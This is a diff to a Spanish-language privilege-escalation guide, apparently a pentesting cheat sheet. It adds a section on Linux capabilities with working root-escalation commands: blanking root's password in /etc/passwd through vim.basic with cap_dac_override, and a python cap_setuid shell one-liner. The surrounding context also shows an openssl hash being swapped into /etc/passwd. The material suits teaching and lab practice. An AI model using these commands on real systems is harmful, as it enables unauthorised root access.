@@ -846,7 +846,7 @@ root
 
 Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:
 
-```bash
+```
 ┌─[user@user]─[/]
 └──╼ openssl passwd -1 -salt root root
 $1$root$9gr5KxwuEdiI80GtIzd.U0
@@ -855,7 +855,7 @@ Lo que recibimos anteriormente lo copiamos y lo reemplazamos por la ```x``` que 
 
 > Archivo sin editar
 
-```bash
+```
 ┌─[user@user]─[/]
 └──╼ nano /etc/passwd
 GNU nano 3.2                                        /etc/passwd                                 
@@ -890,7 +890,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 
 > Archivo editado
 
-```bash
+```
 GNU nano 3.2                                        /etc/passwd                               
 
 root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash
@@ -923,7 +923,7 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 
 Finalmente nos transformamos en root, a través de los datos que asignamos por openssl:
 
-```bash
+```
 ┌─[user@user]─[/]
 └──╼ su root
 Contraseña: root
@@ -935,8 +935,103 @@ root
 
 ### Capabilities
 
-Las capabilities son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Algunas capacidades, como ```cap_sys_admin```, que permite que un ejecutable realice acciones con privilegios administrativos, puede ser peligroso si no se utilizan correctamente. 
+Las capabilities son una característica de seguridad en el sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. 
 
+Para enumerar las capabilities debemos ejecutar el siguiente comando:
+
+```
+┌─[user@user]─[/]
+└──╼ /usr/sbin/getcap -r / 2>/dev/null
+```
+
+O en algunos casos puede ser directamente esto:
+
+```
+┌─[user@user]─[/]
+└──╼ getcap -r / 2>/dev/null
+```
+
+Otra opción:
+
+```
+┌─[user@user]─[/]
+└──╼ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+A continuación, se presenta una tabla que destaca las capabilities que requieren especial atención, ya que pueden ser utilizadas para escalar privilegios.
+
+| Capacidad            | Descripción resumida |
+|----------------------|----------------------|
+| cap_setuid           | Permite a un proceso cambiar su ID de usuario efectivo, pudiendo obtener los privilegios de otro usuario, incluido root. |
+| cap_setgid           | Permite a un proceso cambiar su ID de grupo efectivo, pudiendo obtener los privilegios de otro grupo, incluido el grupo root. |
+| cap_sys_admin        | Otorga amplios privilegios administrativos, similares a los de root, como modificar configuraciones del sistema o montar sistemas de archivos. |
+| cap_dac_override     | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución sobre archivos. |
+
+Finalmente, se exponen algunos ejemplos que ilustran lo anteriormente descrito.
+
+#### cap_dac_overrid capability en vim.basic
+
+```
+┌─[user@user]─[/]
+└──╼ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+/usr/bin/vim.basic cap_dac_override=eip
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
+
+Al detectar ```cap_dac_override=eip```, tenemos la capacidad de modificar un archivo del sistema.
+
+```
+┌─[user@user]─[/]
+└──╼ cat /etc/passwd | head -n1
+
+root:x:0:0:root:/root:/bin/bash
+```
+
+Si elminamos la "x" podremos usar el comando su para iniciar sesión como root sin que se solicite la contraseña. Para ello podemos realizarlo manualmente.
+
+```
+┌─[user@user]─[/]
+└──╼ /usr/bin/vim.basic /etc/passwd
+```
+
+También es posible realizarlo de la siguiente forma:
+
+```
+┌─[user@user]─[/]
+└──╼ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+
+┌─[user@user]─[/]
+└──╼ cat /etc/passwd | head -n1
+
+root::0:0:root:/root:/bin/bash
+
+┌─[user@user]─[/]
+└──╼ su root
+
+# whoami
+root
+```
+
+#### cap_setuid capability en python
+
+```
+┌─[user@user]─[/]
+└──╼ /usr/sbin/getcap -r / 2>/dev/null
+
+/usr/bin/python3.10 cap_setuid=ep
+/usr/bin/ping cap_net_raw=ep
+```
+
+En este caso se detecta ```cap_setuid=ep``` lo que nos permite que un proceso establezca su ID de usuario efectivo (SUID), lo que puede utilizarse para obtener los privilegios de otro usuario, incluido el usuario root. Para ello realizamos lo siguiente:
+
+```
+┌─[user@user]─[/]
+└──╼ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+root
+```
 
 ### Contraseñas en la configuración web
 
